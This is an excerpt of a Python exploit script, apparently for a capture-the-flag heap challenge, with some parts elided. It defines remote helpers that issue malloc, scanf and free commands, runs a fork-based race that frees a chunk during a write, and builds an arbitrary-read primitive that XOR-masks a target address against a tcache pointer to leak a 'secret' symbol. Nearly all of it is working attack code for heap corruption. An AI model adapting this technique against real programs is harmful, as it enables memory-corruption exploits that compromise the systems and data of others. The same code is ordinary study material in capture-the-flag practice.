...
class thread_comm(p.remote):
    ...
    def malloc(self, idx: bytes):
        self.prompt_cmd(b"malloc " + idx)


    def scanf(self, idx: bytes, msg):
        cmd = b"scanf " + idx + b' ' + msg
        self.prompt_cmd(cmd)


    def free(self, idx: bytes):
...
def kill_workers():     # mhm, I mean retire*
    print(pids)
    for pid in pids:
...
def arbitrary_read(target_addr: int, tcache_addr_loc: int):
    # maybe check if target_addr is a mod of 8/16
    target_addr = target_addr ^ (tcache_addr_loc)
    ...
    # make_workers(1, thd2.free, b'0')
    while True:
        if not os.fork():
            thd2.free(b'0')
            sys.exit(0)
        thd1.scanf(b'0', target_addr_packed)
        os.wait()
...
def exploit():
    ...
    secret = arbitrary_read(elf.symbols['secret'] + 0xc0, tcache_addr)
